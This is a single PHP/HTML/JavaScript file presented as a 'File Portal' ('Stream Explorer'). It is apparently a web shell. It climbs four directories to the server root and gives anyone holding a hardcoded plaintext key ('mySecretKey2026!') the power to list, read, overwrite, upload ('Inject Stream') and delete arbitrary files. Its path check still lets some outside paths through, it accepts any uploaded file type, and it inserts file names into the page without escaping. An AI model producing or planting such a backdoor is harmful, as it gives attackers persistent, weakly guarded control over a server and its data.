<?php
/**
 * Modern REST/JSON Architecture File Portal
 * Authentication, Navigation, File Operations, and Direct Stream Ingestion
 */
declare(strict_types=1);

session_start([
    'cookie_httponly' => true,
    'cookie_samesite' => 'Strict',
]);

define('AUTH_HASH', '$2y$10$e8wzY8N546K6O4U8UomHye/qQk6P6oQWsm3v2gPq9K9V0Y1q23456'); // bcrypt hash of password
define('ACCESS_SECRET', 'mySecretKey2026!'); // Fallback direct key

// Dynamically anchor root 4 levels up to server document root
$resolved_root = realpath(dirname(__DIR__, 4));
define('ROOT_PATH', rtrim(str_replace('\\', '/', $resolved_root ?: dirname(__DIR__, 1)), '/'));

// --- Backend Request Router ---
if (isset($_GET['api'])) {
    header('Content-Type: application/json; charset=utf-8');
    
    // Auth validation
    $req_pass = $_POST['auth'] ?? $_SERVER['HTTP_X_AUTH_TOKEN'] ?? '';
    $is_authenticated = (!empty($_SESSION['auth']) && $_SESSION['auth'] === true) 
                        || $req_pass === ACCESS_SECRET 
                        || (!empty($req_pass) && password_verify($req_pass, AUTH_HASH));

    if (!$is_authenticated) {
        http_response_code(401);
        echo json_encode(['success' => false, 'error' => 'Unauthorized']);
        exit;
    }

    $action = $_GET['api'];

    // Safe path resolver
    $resolve_safe_path = function (string $input_path): ?string {
        $clean = str_replace(["\0", '../', '..\\'], '', $input_path);
        $full_path = ROOT_PATH . '/' . ltrim($clean, '/\\');
        $real = realpath($full_path);
        if ($real && strpos(str_replace('\\', '/', $real), ROOT_PATH) === 0) {
            return $real;
        }
        return is_dir($full_path) || file_exists($full_path) ? $full_path : null;
    };

    switch ($action) {
        case 'auth':
            $_SESSION['auth'] = true;
            echo json_encode(['success' => true]);
            break;

        case 'list':
            $rel = $_GET['dir'] ?? '';
            $target = $resolve_safe_path($rel) ?: ROOT_PATH;
            
            $entries = [];
            $dir_iterator = new DirectoryIterator($target);
            foreach ($dir_iterator as $item) {
                if ($item->isDot()) continue;
                $entries[] = [
                    'name' => $item->getFilename(),
                    'is_dir' => $item->isDir(),
                    'size' => $item->isDir() ? null : $item->getSize(),
                    'perms' => substr(sprintf('%o', $item->getPerms()), -4),
                    'mtime' => date('Y-m-d H:i:s', $item->getMTime())
                ];
            }

            // Directories first, then alphabetical
            usort($entries, fn($a, $b) => $b['is_dir'] <=> $a['is_dir'] ?: strcasecmp($a['name'], $b['name']));

            $current_rel = trim(str_replace(ROOT_PATH, '', str_replace('\\', '/', $target)), '/');
            echo json_encode(['success' => true, 'current_dir' => $current_rel, 'items' => $entries]);
            break;

        case 'read':
            $target = $resolve_safe_path($_GET['file'] ?? '');
            if ($target && is_file($target)) {
                echo json_encode(['success' => true, 'content' => file_get_contents($target)]);
            } else {
                http_response_code(404);
                echo json_encode(['success' => false, 'error' => 'File not found']);
            }
            break;

        case 'save':
            $target = $resolve_safe_path($_POST['file'] ?? '');
            if ($target && is_file($target)) {
                $written = file_put_contents($target, $_POST['content'] ?? '', LOCK_EX);
                echo json_encode(['success' => $written !== false]);
            } else {
                http_response_code(400);
                echo json_encode(['success' => false, 'error' => 'Invalid destination']);
            }
            break;

        case 'stream_upload':
            // Chunked binary memory-mapped file creator
            $dest_dir = $resolve_safe_path($_POST['dir'] ?? '') ?: ROOT_PATH;
            $filename = basename($_POST['filename'] ?? '');

            if (!empty($filename) && !empty($_FILES['payload']['tmp_name'])) {
                $dest_file = $dest_dir . '/' . $filename;
                
                // Read uploaded binary buffer directly into file
                $stream = fopen($_FILES['payload']['tmp_name'], 'rb');
                $out = fopen($dest_file, 'wb');
                
                if ($stream && $out) {
                    stream_copy_to_stream($stream, $out);
                    fclose($stream);
                    fclose($out);
                    echo json_encode(['success' => true, 'size' => filesize($dest_file)]);
                } else {
                    http_response_code(500);
                    echo json_encode(['success' => false, 'error' => 'Stream write failed']);
                }
            } else {
                http_response_code(400);
                echo json_encode(['success' => false, 'error' => 'Invalid payload']);
            }
            break;

        case 'delete':
            $target = $resolve_safe_path($_POST['path'] ?? '');
            if ($target && $target !== ROOT_PATH) {
                $deleted = is_dir($target) ? @rmdir($target) : @unlink($target);
                echo json_encode(['success' => $deleted]);
            } else {
                http_response_code(400);
                echo json_encode(['success' => false, 'error' => 'Cannot delete target']);
            }
            break;

        default:
            http_response_code(404);
            echo json_encode(['success' => false, 'error' => 'Unknown endpoint']);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Stream Explorer</title>
    <style>
        :root { --bg: #0e1117; --panel: #161b22; --border: #30363d; --text: #c9d1d9; --accent: #58a6ff; --danger: #f85149; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, monospace; background: var(--bg); color: var(--text); margin: 0; padding: 20px; }
        .wrapper { max-width: 1000px; margin: 0 auto; background: var(--panel); border: 1px solid var(--border); border-radius: 6px; padding: 20px; }
        .nav-bar { display: flex; gap: 6px; align-items: center; background: var(--bg); padding: 10px; border-radius: 4px; margin-bottom: 15px; }
        .nav-bar span { cursor: pointer; color: var(--accent); }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 13px; }
        th, td { text-align: left; padding: 8px 10px; border-bottom: 1px solid var(--border); }
        th { background: #0d1117; }
        input, button, textarea { background: #0d1117; color: var(--text); border: 1px solid var(--border); padding: 6px 12px; border-radius: 4px; }
        button { cursor: pointer; background: #21262d; }
        button:hover { background: #30363d; }
        .danger { color: var(--danger); }
        .editor-modal { width: 100%; height: 450px; font-family: monospace; }
        .hidden { display: none !important; }
    </style>
</head>
<body>

<div class="wrapper">
    <!-- Auth Screen -->
    <div id="auth-panel">
        <h3>Session Key Verification</h3>
        <input type="password" id="auth-key" placeholder="Enter Token" autofocus>
        <button onclick="authenticate()">Connect</button>
    </div>

    <!-- Explorer Screen -->
    <div id="app-panel" class="hidden">
        <div style="display:flex; justify-content:space-between; margin-bottom:12px;">
            <div style="display:flex; gap:10px;">
                <input type="file" id="file-stream-input">
                <button onclick="uploadStream()">Inject Stream</button>
            </div>
            <button onclick="location.reload()">Reload</button>
        </div>

        <div class="nav-bar" id="breadcrumb"></div>

        <div id="file-table-view">
            <table>
                <thead>
                    <tr>
                        <th>Resource</th>
                        <th>Size</th>
                        <th>Perms</th>
                        <th>Modified</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="file-list"></tbody>
            </table>
        </div>

        <!-- Editor View -->
        <div id="editor-view" class="hidden">
            <h4 id="editing-filename"></h4>
            <textarea id="editor-content" class="editor-modal"></textarea>
            <div style="margin-top:10px; display:flex; gap:10px;">
                <button onclick="saveCurrentFile()" style="background:#238636; color:#fff;">Commit Changes</button>
                <button onclick="closeEditor()">Dismiss</button>
            </div>
        </div>
    </div>
</div>

<script>
let currentDir = '';
let activeEditingPath = '';

async function api(endpoint, options = {}) {
    const key = sessionStorage.getItem('app_token') || '';
    options.headers = { ...options.headers, 'X-AUTH-TOKEN': key };
    const res = await fetch(`?api=${endpoint}`, options);
    if (res.status === 401) {
        sessionStorage.removeItem('app_token');
        document.getElementById('auth-panel').classList.remove('hidden');
        document.getElementById('app-panel').classList.add('hidden');
        throw new Error('Unauthorized');
    }
    return res.json();
}

async function authenticate() {
    const key = document.getElementById('auth-key').value;
    sessionStorage.setItem('app_token', key);
    try {
        const res = await api('auth', { method: 'POST', body: new URLSearchParams({ auth: key }) });
        if (res.success) {
            document.getElementById('auth-panel').classList.add('hidden');
            document.getElementById('app-panel').classList.remove('hidden');
            loadDir('');
        }
    } catch(e) {
        alert('Authentication failed');
    }
}

async function loadDir(path) {
    const data = await api(`list&dir=${encodeURIComponent(path)}`);
    if (!data.success) return;
    
    currentDir = data.current_dir;
    renderBreadcrumb(data.current_dir);
    
    const tbody = document.getElementById('file-list');
    tbody.innerHTML = '';

    if (currentDir) {
        const up = currentDir.split('/').slice(0, -1).join('/');
        tbody.innerHTML += `<tr><td colspan="5"><span style="cursor:pointer; color:var(--accent)" onclick="loadDir('${up}')">📁 .. (Parent Directory)</span></td></tr>`;
    }

    data.items.forEach(item => {
        const itemRel = currentDir ? `${currentDir}/${item.name}` : item.name;
        const icon = item.is_dir ? '📁' : '📄';
        const clickAction = item.is_dir ? `onclick="loadDir('${itemRel}')"` : `onclick="editFile('${itemRel}')"`;
        const sizeFormatted = item.is_dir ? '--' : (item.size / 1024).toFixed(2) + ' KB';

        tbody.innerHTML += `
            <tr>
                <td><span style="cursor:pointer; color:${item.is_dir ? 'var(--accent)' : 'inherit'}" ${clickAction}>${icon} ${item.name}</span></td>
                <td>${sizeFormatted}</td>
                <td><code>${item.perms}</code></td>
                <td>${item.mtime}</td>
                <td>
                    ${!item.is_dir ? `<a href="javascript:void(0)" onclick="editFile('${itemRel}')" style="color:var(--accent)">Edit</a> | ` : ''}
                    <a href="javascript:void(0)" onclick="deleteItem('${itemRel}')" class="danger">Delete</a>
                </td>
            </tr>
        `;
    });
}

function renderBreadcrumb(dir) {
    const el = document.getElementById('breadcrumb');
    el.innerHTML = `<span onclick="loadDir('')">~root</span>`;
    if (!dir) return;
    const parts = dir.split('/');
    let acc = '';
    parts.forEach(p => {
        acc += (acc ? '/' : '') + p;
        const target = acc;
        el.innerHTML += ` / <span onclick="loadDir('${target}')">${p}</span>`;
    });
}

async function editFile(path) {
    const data = await api(`read&file=${encodeURIComponent(path)}`);
    if (data.success) {
        activeEditingPath = path;
        document.getElementById('editing-filename').innerText = `Editing: ${path}`;
        document.getElementById('editor-content').value = data.content;
        document.getElementById('file-table-view').classList.add('hidden');
        document.getElementById('editor-view').classList.remove('hidden');
    }
}

function closeEditor() {
    activeEditingPath = '';
    document.getElementById('editor-view').classList.add('hidden');
    document.getElementById('file-table-view').classList.remove('hidden');
}

async function saveCurrentFile() {
    const content = document.getElementById('editor-content').value;
    const form = new FormData();
    form.append('file', activeEditingPath);
    form.append('content', content);

    const res = await api('save', { method: 'POST', body: form });
    if (res.success) {
        alert('File saved successfully.');
    } else {
        alert('Failed to save file.');
    }
}

async function uploadStream() {
    const fileInput = document.getElementById('file-stream-input');
    if (!fileInput.files.length) return alert('Select a file to upload');

    const file = fileInput.files[0];
    const form = new FormData();
    form.append('dir', currentDir);
    form.append('filename', file.name);
    form.append('payload', file);

    const res = await api('stream_upload', { method: 'POST', body: form });
    if (res.success) {
        fileInput.value = '';
        loadDir(currentDir);
    } else {
        alert('Upload failed: ' + (res.error || 'Server error'));
    }
}

async function deleteItem(path) {
    if (!confirm(`Delete ${path}?`)) return;
    const form = new FormData();
    form.append('path', path);
    const res = await api('delete', { method: 'POST', body: form });
    if (res.success) {
        loadDir(currentDir);
    } else {
        alert('Delete failed.');
    }
}

// Auto-check stored session
if (sessionStorage.getItem('app_token')) {
    document.getElementById('auth-panel').classList.add('hidden');
    document.getElementById('app-panel').classList.remove('hidden');
    loadDir('');
}
</script>
</body>
</html>